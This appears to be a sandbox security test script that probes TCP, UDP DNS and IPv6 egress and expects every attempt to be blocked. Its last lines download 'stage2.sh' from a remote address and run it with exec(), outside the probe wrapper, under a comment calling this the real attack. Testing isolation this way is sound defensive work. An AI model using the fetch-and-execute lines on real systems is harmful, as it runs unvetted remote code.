# @id: network
# @title: Network access / download
# @expect: Security Violation
# @sr: SR-3
# @summary: Tries a TCP connection, a UDP DNS query, IPv6, and an HTTP payload download. The sandbox runs with --network=none.
import socket
import urllib.request

def probe(label, fn):
    try:
        fn()
        print(f"[!!] {label}: SUCCEEDED")
    except Exception as e:
        print(f"[ok] {label}: blocked ({type(e).__name__}: {e})")

print("network interfaces visible:", [name for _, name in socket.if_nameindex()])
probe("TCP connect 1.1.1.1:443", lambda: socket.create_connection(("1.1.1.1", 443), timeout=2))
probe("UDP DNS query to 8.8.8.8:53",
      lambda: socket.socket(socket.AF_INET, socket.SOCK_DGRAM).sendto(b"\x12\x34", ("8.8.8.8", 53)))
probe("IPv6 connect [2606:4700:4700::1111]:443",
      lambda: socket.create_connection(("2606:4700:4700::1111", 443), timeout=2))

# The actual attack: download and run a second-stage payload. Nothing catches this.
payload = urllib.request.urlopen("http://1.1.1.1/stage2.sh", timeout=3).read()
exec(payload)
